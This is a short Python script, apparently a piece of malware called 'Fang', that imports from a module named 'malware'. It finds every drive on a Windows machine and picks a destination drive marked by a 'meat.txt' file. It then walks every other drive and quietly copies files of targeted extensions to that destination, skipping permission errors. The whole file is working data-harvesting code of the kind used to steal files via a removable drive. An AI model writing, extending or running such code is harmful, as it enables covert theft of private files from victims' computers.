import shutil
from malware import *
import os
from itertools import chain
from string import ascii_uppercase


# this function returns all of the drivers the computer has.
def get_drivers():
    list = []
    for letter in ascii_uppercase:
        if (os.path.exists(letter + r':\\')):
            list.append(letter + r':\\')
    return list


# this function returns the place that Fang should copy the files to
def check(list):
    global the_place
    for driver in list:
        if os.path.exists(driver + 'meat.txt'):
            the_place = driver
    return the_place


the_place = ""
# the drivers i need to go thorough
drivers = get_drivers()
# the place that all the copied files go to
des = check(drivers)
drivers.remove(des)

for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
    for file in filenames:
        if any(file.endswith(extension) for extension in ex_list):
            try:
                shutil.copy(os.path.join(dirpath, file), des)
            except PermissionError:
                pass
            except FileNotFoundError:
                pass
